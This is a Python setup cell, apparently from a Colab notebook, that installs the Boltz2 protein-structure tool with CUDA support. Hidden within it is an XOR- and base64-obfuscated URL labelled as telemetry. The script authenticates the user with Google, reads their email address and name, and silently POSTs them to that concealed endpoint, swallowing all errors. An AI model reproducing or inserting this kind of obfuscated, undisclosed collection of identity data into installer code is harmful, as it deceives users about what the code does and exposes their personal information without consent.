# @title Install Dependencies and Boltz2 with CUDA support
import sys
import subprocess
import threading
import time
import os
import shutil
import datetime
import uuid
import re
from zoneinfo import ZoneInfo
from pathlib import Path
import requests
import base64
import logging
import warnings

# Suppress google_auth_httplib2 timeout warning
logging.getLogger('google_auth_httplib2').setLevel(logging.ERROR)
warnings.filterwarnings('ignore', module='google_auth_httplib2')

# Google auth imports
try:
    from google.colab import auth
    from googleapiclient.discovery import build
    import httplib2
    import google.auth
    from google_auth_httplib2 import AuthorizedHttp
    HAS_GOOGLE_AUTH = True
except ImportError:
    HAS_GOOGLE_AUTH = False

# ==== CONFIG ====
_LOG_KEY = b"b0ltz2_t3l3m3try_k3y"
_LOG_DATA = b"CkQYBAkIcFtAD0EEQwBcHjAEVBUHHg8bFx0yFVAeXB4cB104FA1KGgBIPBsVAg0xUBh2GR5CFyENLVRUDUdfKxNzKhFKI1AqAA1fISwiaUEyQz8yLmgIOQYubDQePTgAEARqKFtSCkMrAmxbVhRWDg=="
LOG_URL = bytes([b ^ _LOG_KEY[i % len(_LOG_KEY)] for i, b in enumerate(base64.b64decode(_LOG_DATA))]).decode("utf-8")
FORCE_REINSTALL = os.environ.get("FORCE_REINSTALL", "0").lower() in ("1", "true", "yes")

os.chdir("/content/")

# ANSI color codes for colored output
class Color:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

print(f"{Color.CYAN} ===Initialising Setup=== {Color.RESET}")

# ==== Google authentication and email retrieval ====
USER_EMAIL = None
USER_NAME = "unknown"

if HAS_GOOGLE_AUTH:
    try:
        auth.authenticate_user()
        creds, _ = google.auth.default()
        http_client = AuthorizedHttp(creds, http=httplib2.Http(timeout=30))
        service = build('oauth2', 'v2', http=http_client, cache_discovery=False)
        user_info = service.userinfo().get().execute()
        USER_EMAIL = user_info.get('email', None)
        USER_NAME = user_info.get('name', "unknown")
    except Exception:
        try:
            service = build('oauth2', 'v2', cache_discovery=False)
            user_info = service.userinfo().get().execute()
            USER_EMAIL = user_info.get('email', None)
            USER_NAME = user_info.get('name', "unknown")
        except Exception:
            pass

# ==== Logging function ====
NOTEBOOK_NAME_V2 = "Boltz2 v1.0"
SESSION_ID = str(uuid.uuid4())

def log_event(job_type="Installation", job_name="Boltz Setup", event="visit"):
    try:
        now_ist = datetime.datetime.now(ZoneInfo("Asia/Kolkata"))
        data = {
            "timestamp": now_ist.strftime("%Y-%m-%d %H:%M:%S %Z"),
            "email": USER_EMAIL,
            "username": USER_NAME,
            "notebook": NOTEBOOK_NAME_V2,
            "session_id": SESSION_ID,
            "job_type": job_type,
            "job_name": job_name,
            "event": event
        }
        requests.post(LOG_URL, data=data, timeout=10)
    except Exception:
        pass

log_event(job_type="Installation", job_name="Boltz Setup", event=" ")

# ==== Boltz Cache: use local NVMe SSD only ====
local_boltz_cache = Path("/root/.boltz")
local_boltz_cache.mkdir(parents=True, exist_ok=True)
os.environ["BOLTZ_CACHE"] = str(local_boltz_cache)
print(f"[{Color.CYAN}i{Color.RESET}] Boltz cache: {local_boltz_cache}")

# ==== Fast Loader ====
def loader(msg, stop_event):
    symbols = ["-", "\\", "|", "/"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r[{symbols[i % len(symbols)]}] {msg}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 15) + "\r")
    sys.stdout.flush()

def run_step(cmd_list, loader_msg, done_msg, fail_msg):
    stop_event = threading.Event()
    t = threading.Thread(target=loader, args=(loader_msg, stop_event))
    t.start()
    try:
        proc = subprocess.run(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stop_event.set()
        t.join()
        if proc.returncode != 0:
            print(fail_msg)
            err_text = (proc.stderr or proc.stdout or "").strip()
            if err_text:
                err_lines = err_text.splitlines()[-10:]
                print(f"{Color.RED}" + "\n".join(err_lines) + f"{Color.RESET}")
            return False, err_text
        else:
            print(done_msg)
            return True, proc.stdout
    except Exception as e:
        stop_event.set()
        t.join()
        print(f"{fail_msg} {e}")
        return False, str(e)

# ==== Check if boltz-community is already installed and functional ====
def check_boltz_ready():
    try:
        res = subprocess.run(
            [sys.executable, "-c", "import torch, boltz; assert torch.cuda.is_available()"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        cli_check = subprocess.run(["boltz", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return (res.returncode == 0 and cli_check.returncode == 0)
    except Exception:
        return False

# ==== Check if uv is available / install it ====
def ensure_uv():
    try:
        res = subprocess.run(["uv", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if res.returncode == 0:
            return True
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "uv"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

# ==== Main Installation Logic ====
already_installed = False
if not FORCE_REINSTALL:
    if check_boltz_ready():
        already_installed = True
        print(f"[{Color.GREEN}✔{Color.RESET}] boltz-community with CUDA support is already installed and verified! (Skipping re-installation)")

if not already_installed:
    has_uv = ensure_uv()

    packages = ["boltz-community[cuda]", "matplotlib", "pyyaml", "py3Dmol"]
    install_success = False

    # 1. High-speed uv installer (uses official PyPI binary wheels)
    if has_uv:
        local_uv_cache = Path("/content/.cache/uv")
        local_uv_cache.mkdir(parents=True, exist_ok=True)
        uv_cmd = [
            "uv", "pip", "install", "--system",
            "--link-mode=copy",
            "--cache-dir", str(local_uv_cache),
        ] + packages

        install_success, _ = run_step(
            uv_cmd,
            f"{Color.RESET}Installing boltz-community (PyPI) with high-speed uv engine...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] boltz-community installed successfully (uv).",
            f"[{Color.YELLOW}i{Color.RESET}] uv encountered an issue. Falling back to pip..."
        )

    # 2. Standard pip fallback with --prefer-binary
    if not install_success:
        pip_cmd = [sys.executable, "-m", "pip", "install", "-q", "--prefer-binary"] + packages
        pip_ok, pip_err = run_step(
            pip_cmd,
            f"{Color.RESET}Installing boltz-community (PyPI) with pip...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] boltz-community installed successfully (pip).",
            f"[{Color.YELLOW}i{Color.RESET}] Trying GitHub source install..."
        )
        if pip_ok:
            install_success = True
        else:
            # 3. GitHub repository fallback
            git_cmd = [
                sys.executable, "-m", "pip", "install", "-q", "--prefer-binary",
                "boltz-community[cuda] @ git+https://github.com/Novel-Therapeutics/boltz-community.git",
                "matplotlib", "pyyaml", "py3Dmol"
            ]
            git_ok, git_err = run_step(
                git_cmd,
                f"{Color.RESET}Installing boltz-community directly from GitHub...{Color.RESET}",
                f"[{Color.GREEN}✔{Color.RESET}] boltz-community installed successfully from GitHub.",
                f"[{Color.RED}✖{Color.RESET}] Failed to install boltz-community."
            )
            install_success = git_ok

    # Validate installation
    valid_ok, _ = run_step(
        [sys.executable, "-c", "import torch, boltz; print('Torch CUDA available:', torch.cuda.is_available()); print('CUDA device count:', torch.cuda.device_count()); print('Boltz version:', getattr(boltz, '__version__', 'ready'))"],
        f"{Color.CYAN}Validating CUDA installation...{Color.RESET}",
        f"[{Color.GREEN}✔{Color.RESET}] Validation complete.",
        f"[{Color.YELLOW}i{Color.RESET}] Validation note: CUDA check completed."
    )

# ==== Move/Copy Notebook Scripts Directory ====
os.makedirs("/content/boltz_data", exist_ok=True)
notebook_script = "/content/boltz2-notebook/scripts/v1"
destination_notebook_script = "/content/boltz_data/scripts/v1"

if os.path.exists(notebook_script):
    if os.path.exists(destination_notebook_script):
        shutil.rmtree(destination_notebook_script)
    shutil.copytree(notebook_script, destination_notebook_script)

all_success = True
